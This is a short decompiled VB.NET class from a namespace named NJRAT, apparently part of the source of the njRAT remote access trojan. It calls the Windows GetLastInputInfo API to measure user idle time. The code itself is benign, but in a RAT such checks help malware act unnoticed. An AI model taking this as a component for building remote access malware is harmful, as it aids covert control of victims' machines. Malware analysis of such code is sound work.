Imports System
Imports System.Runtime.InteropServices

Namespace NJRAT
	' Token: 0x0200001A RID: 26
	Public NotInheritable Class GClass7
		' Token: 0x06000172 RID: 370
		Private Declare Function GetLastInputInfo Lib "User32.dll" (ByRef gstruct0_0 As GClass7.GStruct0) As Boolean

		' Token: 0x06000173 RID: 371 RVA: 0x0000F30C File Offset: 0x0000D50C
		Public Shared Function smethod_0() As UInteger
			Dim gstruct As GClass7.GStruct0 = New GClass7.GStruct0() With { .uint_0 = Convert.ToUInt32(Marshal.SizeOf(gstruct)) }
			GClass7.GetLastInputInfo(gstruct)
			Return Convert.ToUInt32(Environment.TickCount) - gstruct.uint_1
		End Function

		' Token: 0x02000038 RID: 56
		Public Structure GStruct0
			' Token: 0x04000288 RID: 648
			Public uint_0 As UInteger

			' Token: 0x04000289 RID: 649
			Public uint_1 As UInteger
		End Structure
	End Class
End Namespace
